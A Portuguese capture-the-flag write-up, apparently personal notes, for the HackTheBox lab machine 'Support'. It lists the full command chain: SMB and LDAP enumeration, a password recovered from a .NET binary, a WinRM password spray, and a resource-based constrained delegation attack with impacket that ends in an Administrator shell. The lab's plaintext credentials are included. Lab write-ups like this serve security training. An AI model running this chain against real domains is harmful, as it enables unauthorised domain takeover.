
## Enumeracao

```
sudo nmap -sU -p 53,111,113,500,2049,161 support.htb
```

![[../../../media/Pasted image 20240609200955.png]]

```
sudo nmap -sS -p- -Pn -T5 --max-retries 0 support.htb
```

![](../../../media/Pasted%20image%2020240609201207.png)

Entao temos LDAP, DNS, Kerberos, RPC, SMB e WINRM.

### LDAP

```
ldapsearch -x -s base -H ldap://10.10.11.174
```

![](../../../media/Pasted%20image%2020240609201744.png)

### SMB

```
netexec smb 10.10.11.174 -u '' -p '' --shares
```


```
netexec smb 10.10.11.174 -u 'guest' -p '' --shares
```

![](../../../media/Pasted%20image%2020240609201929.png)

```
smbclient -U guest -N //10.10.11.174/support-tools
smbclient -U support.htb/guest -N //10.10.11.174/support-tools

#Este funcionou:
smbclient -U support.htb/guest //10.10.11.174/support-tools
```

```
smbclient -U guest //10.10.11.174/support-tools
```

![](../../../media/Pasted%20image%2020240609203329.png)

Como encontrei esses binários na máquina (inclusive o mais interessante seria o do UserInfo.exe) fui analisá-los na dnSpy e conseguimos obter a seguinte credencial:

![](../../../media/Pasted%20image%2020240611124450.png)

![](../../../media/Pasted%20image%2020240611124520.png)

Para obter a senha em texto claro, tive de refazer esse código em um compilador online:

![](../../../media/Pasted%20image%2020240611124621.png)

Agora tínhamos uma credencial:

```
usuário: ldap
senha: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Então presumi que as próximas enumerações seriam via LDAP. Dessa forma encontramos uma outra senha:

```
ldapsearch -x -H ldap://10.10.11.174 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
```

filtrando esse comando, ficou da seguinte forma:

```
ldapsearch -x -H ldap://10.10.11.174 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" | grep info
```

![](../../../media/Pasted%20image%2020240611124949.png)

Fazendo o password spray, conseguimos obter mais um acesso:

```
netexec winrm 10.10.11.174 -u usernames.txt -p 'Ironside47pleasure40Watchful' --continue
```

![](../../../media/Pasted%20image%2020240611125039.png)

Então temos mais uma credencial obtida:

```
usuário: support
senha: Ironside47pleasure40Watchful
```

Assim conseguimos acesso na máquina via winrm:

```
evil-winrm -i 10.10.11.174 -u support -p Ironside47pleasure40Watchful
```

![](../../../media/Pasted%20image%2020240611125204.png)
Rodando o bloodhound ainda com o usuário LDAP, notamos essa permissão perigosa:

![](../../../media/Pasted%20image%2020240611125601.png)


![](../../../media/Pasted%20image%2020240611125640.png)

Temos permissão de GenericAll no DC, então vamos tentar explorar isso fazendo uma conta de máquina e depois extraindo um ticket de serviço:

```
impacket-addcomputer -method LDAPS -computer-name 'redteam$' -computer-pass 'Summer2018!' -dc-host dc.support.htb -domain-netbios support.htb 'support.htb/support:Ironside47pleasure40Watchful'
```

Fiz algumas tentativas, porém não funcionaram, então testei de uma forma diferente ao final, e dessa vez funcionou:

![](../../../media/Pasted%20image%2020240611130010.png)

```
impacket-addcomputer -method SAMR -computer-name 'redteam$' -computer-pass 'Summer2018!' -dc-host dc.support.htb -domain-netbios support.htb 'support.htb/support:Ironside47pleasure40Watchful'
```


Depois de algumas tentativas, o que funcionou foi:

```
impacket-rbcd -delegate-from 'redteam$' -delegate-to 'DC$' -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'
```

![](../../../media/Pasted%20image%2020240611131451.png)

Depois fiz alguns testes para verificar se conseguia subir o privilégio no domínio:

```
impacket-getST -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'
```

mas o nome do usuário deve corresponder a algum já existente no domínio:

```
impacket-getST -spn 'cifs/dc.support.htb' -impersonate 'Administrator' -dc-ip 10.10.11.174 'support.htb/redteam$:Summer2018!'
```

![](../../../media/Pasted%20image%2020240611132230.png)

Dessa forma funcionou, depois é só passar o ticket:

![](../../../media/Pasted%20image%2020240611132251.png)

```
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
impacket-psexec -k -no-pass Administrator@dc.support.htb
```

